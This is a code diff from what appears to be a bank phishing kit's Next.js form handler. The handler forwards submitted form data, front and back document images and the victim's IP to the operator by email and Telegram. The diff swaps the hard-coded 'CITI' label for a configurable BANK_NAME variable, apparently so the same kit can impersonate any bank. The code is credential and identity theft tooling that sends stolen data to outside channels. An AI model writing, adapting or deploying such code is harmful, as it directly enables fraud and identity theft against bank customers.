@@ -48,7 +48,7 @@ handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
     if (process.env.TO) {
       await sendEmail(
         message,
-        `CITI - ${form} by ROCKET 🚀🚀🚀 From ${ip}`,
+        `${process.env.BANK_NAME} - ${form} by ROCKET 🚀🚀🚀 From ${ip}`,
         [
           {
             filename: `Front.${front[0].headers[`content-type`].split(`/`)[1]}`,
@@ -65,7 +65,7 @@ handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
     if (process.env.TELEGRAM_ID) {
       await sendTelegram({
         message: `
-        CITI - ${form} by ROCKET 🚀🚀🚀 From ${ip}
+        ${process.env.BANK_NAME} - ${form} by ROCKET 🚀🚀🚀 From ${ip}
         ${message}
       `,
         medias: [front[0], back[0]],
